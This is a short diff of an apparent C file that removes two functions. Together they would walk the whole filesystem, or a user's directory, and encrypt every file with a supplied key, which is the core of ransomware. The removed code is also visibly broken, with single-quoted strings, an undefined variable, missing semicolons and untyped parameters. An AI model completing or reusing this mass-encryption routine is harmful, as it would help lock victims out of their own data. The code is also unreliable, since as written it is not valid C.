@@ -23,30 +23,6 @@ void handleErrors(void) {
     abort();
 }
 
-void ecryption(user, key){
-    if(user == 'admin'){
-        encrypt_user_files('/', key)
-    }
-    else if (user != NULL){
-        encrypt_user_files(user+'/', key)
-    }
-    else{
-        handleErrors();
-    }
-}
-
-void encrypt_user_files(dir_path, key){
-    if (!exists(dir_path)) 
-        handleErrors();
-    else{
-        len = strlen(name);
-        dirp = opendir(dir_path);
-        while ((dp = readdir(dirp)) != NULL)
-            encrypt_file(dp->d_name, key)
-        (void)closedir(dirp);
-    }
-}
-
 string RandomString(int ch)
 {
     char letter[26] = { 'a', 'b', 'c', 'd', 'e', 'f', 'g',
